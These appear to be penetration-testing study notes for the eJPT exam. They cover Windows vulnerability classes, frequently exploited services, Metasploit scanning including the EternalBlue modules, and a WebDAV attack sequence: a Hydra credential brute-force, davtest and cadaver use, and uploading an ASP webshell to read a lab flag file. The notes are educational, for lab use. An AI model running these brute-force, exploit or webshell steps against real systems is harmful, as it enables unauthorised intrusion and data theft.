# 09 Vulnerability Assesment

## Overview Of Windows Vulnerabilities
_Windows OS’s developed in C_

- **Information disclosure** (access confidential data)
- **Buffer overflows** (write data to buffer and overrun the allocated buffer, consequently writing data to allocated memory addresses)
- **Remote code execution** (remotely execute code on the target system)
- **Privilege escalation** (elevate privileges)
- **Denial of Service (DOS)** (consume system/host’s resources)

## Frequently Exploited Windows Services

| Protocol/Service                                    | Ports              | Purpose                                                                                                                                                   |
| --------------------------------------------------- | ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Microsoft IIS** (Internet Information Services)   | TCP ports 80/443   | Proprietary web server software developed by Microsoft that runs on Windows.                                                                              |
| **WebDAV** (Web Distributed Authoring & Versioning) | TCP ports 80/443   | HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server. |
| **SMB/CIFS** (Server Message Block Protocol)        | TCP port 445       | Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computer on a local network (LAN).                  |
| **RDP** (Remote Desktop Protocol)                   | TCP port 3389      | Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system.                    |
| **WinRM** (Windows Remote Management Protocol)      | TCP ports 5986/443 | Windows remote management protocol that can be used to facilitate remote access with Windows systems.                                                     |
|                                                     |                    |                                                                                                                                                           |

## Vulnerability Scanning with MSF
```bash
PLUGIN: db_autopwn
msf6: load db_autopwn
msf6: db_autopwn -p -t
msf6: db_autopwn -p -t -PI 445
msf6: analyze
msf6: vulns
msf6: workspace -a <name>
msf6: db_nmap -sS -sV -O <ip>
msf6: hosts
msf6: services
msf6: search type:exploit name:<name>
msf6: searchsploit “<name>” | grep -e “Metasploit”
msf6: search eternalblue
msf6: auxiliary /scanner/smb/smb_ms17_010
msf6: exploit /windows/smb/ms17_010_eternalblue
```

## WebDAV Vulnerabilities
Enable a web server to function as a file server.
Run on top Microsoft IIS or Apache.

##### **Exploitation**

- **Identifying** whether it has been configured to run on IIS or Apache
- **Brute-force** to identify legitimate credentials
- **Authenticate** and **upload** malicious .asp payload

###### **Tools**

- **davtest**: used to scan, authenticate and exploit a WebDAV server
- **cadaver**: it supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.

```bash
nmap -sV -sC <ip>
nmap -sV -p 80 —script=http-enum
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.27.131 http-get /webdav/
davtest -url [http://hostname/webdav](http://hostname/webdav)
davtest -auth bob:password_123321
cadaver [http://hostname](http://hostname)[:port]/path
put /usr/share/webshells/asp/webshell.asp
webshell: ls
webshell: dir C:\
webshell: type C:\flag.txt
```

#eJPT #cybersecurity 